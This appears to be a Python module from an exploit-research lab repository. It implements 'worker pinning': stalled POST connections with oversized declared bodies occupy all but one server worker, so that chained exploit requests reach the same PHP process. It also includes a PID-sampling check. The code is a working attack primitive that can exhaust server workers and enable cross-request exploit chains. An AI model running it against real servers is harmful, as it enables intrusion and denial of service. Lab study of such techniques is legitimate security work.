"""Worker pinning — occupy N-1 request workers so consecutive exploit
requests land on the same child process.

The cross-request chains (CVE-2026-109619 stale globals, the 9bie A1/B1/A2/B2
ladder) only work if the producer and the consumer are handled by the same
OS process. Public kits solve this by opening `workers - 1` connections that
declare a large body, send one byte, and stall (9bie: 149 holders on the
stock 150-worker prefork default; devploit: N-1 keep-alive connections).

This module implements the same primitive for the repo's own labs:

  - `Holder`        one stalled POST that occupies a worker
  - `WorkerPinner`  context manager: open holders, sample PIDs, close

It is deliberately lab-shaped: no retry storm, no target list, no remote
orchestration. The caller decides what to do inside the pinned window.
"""

import re
import socket
import time

from . import probe

PID_RE = re.compile(rb"pid=(\d+)")


class Holder:
    """A single stalled POST: full headers, declared body, one byte sent."""

    def __init__(self, host, port, path="/index.php", declared=1 << 20,
                 body=b"x", connect_timeout=10):
        self.host = host
        self.port = port
        self.path = path
        self.declared = declared
        self.body = body
        self.connect_timeout = connect_timeout
        self.sock = None

    def open(self):
        self.sock = socket.create_connection(
            (self.host, self.port), timeout=self.connect_timeout
        )
        # Connection: keep-alive so the worker stays in this request rather
        # than closing after the (never arriving) body.
        req = (
            f"POST {self.path} HTTP/1.1\r\n"
            f"Host: {self.host}\r\n"
            f"Content-Type: application/x-www-form-urlencoded\r\n"
            f"Content-Length: {self.declared}\r\n"
            f"Connection: keep-alive\r\n\r\n"
        ).encode("latin-1") + self.body
        self.sock.sendall(req)
        return self

    def close(self):
        if self.sock is not None:
            try:
                self.sock.close()
            finally:
                self.sock = None


class WorkerPinner:
    """Context manager that holds `holders` workers for the duration.

    Usage:
        with WorkerPinner(host, port, holders=3):
            run_chain_requests()      # all land on the remaining worker

    `sample_pids()` is the verification oracle: it requires the lab's
    `worker_id.php` (returns `pid=<getmypid()>`).
    """

    def __init__(self, host, port, holders=3, path="/index.php",
                 declared=1 << 20, settle=0.35, verbose=False):
        self.host = host
        self.port = port
        self.holders_n = max(0, int(holders))
        self.path = path
        self.declared = declared
        self.settle = settle
        self.verbose = verbose
        self.holders = []

    def __enter__(self):
        for _ in range(self.holders_n):
            self.holders.append(Holder(
                self.host, self.port, self.path, self.declared
            ).open())
        # Let every holder reach the worker's body read before the pinned
        # requests start.
        if self.holders_n:
            time.sleep(self.settle)
        return self

    def __exit__(self, exc_type, exc, tb):
        for h in self.holders:
            h.close()
        self.holders = []
        return False

    # ---- verification -------------------------------------------------
    def sample_pids(self, worker_id_path="/worker_id.php", count=8,
                    timeout=10, recv_timeout=8):
        """GET the identity endpoint `count` times; return the PIDs seen."""
        pids = []
        for _ in range(count):
            try:
                resp = probe.http_get(
                    self.host, self.port, worker_id_path,
                    timeout=timeout, recv_timeout=recv_timeout,
                )
            except OSError:
                continue
            m = PID_RE.search(resp)
            if m:
                pids.append(int(m.group(1)))
        return pids


def sample_pids(host, port, worker_id_path="/worker_id.php", count=8,
                timeout=10, recv_timeout=8):
    """Sample worker PIDs without holding any connection."""
    return WorkerPinner(host, port, holders=0).sample_pids(
        worker_id_path, count, timeout, recv_timeout
    )


def pinning_report(host, port, holders=3, worker_id_path="/worker_id.php",
                   control_samples=16, pinned_samples=12, path="/index.php"):
    """Measure worker spread before/after holding `holders` workers.

    Returns a dict:
      control_pids / pinned_pids, control_distinct / pinned_distinct,
      pinned (bool), note
    """
    control = sample_pids(host, port, worker_id_path, count=control_samples)
    with WorkerPinner(host, port, holders=holders, path=path):
        pinned = sample_pids(host, port, worker_id_path, count=pinned_samples)
    return {
        "control_pids": control,
        "pinned_pids": pinned,
        "control_distinct": len(set(control)),
        "pinned_distinct": len(set(pinned)),
        "pinned": bool(pinned) and len(set(pinned)) == 1,
        "note": (
            f"holders={holders} occupied; "
            f"control spread={len(set(control))}, pinned spread={len(set(pinned))}"
        ),
    }
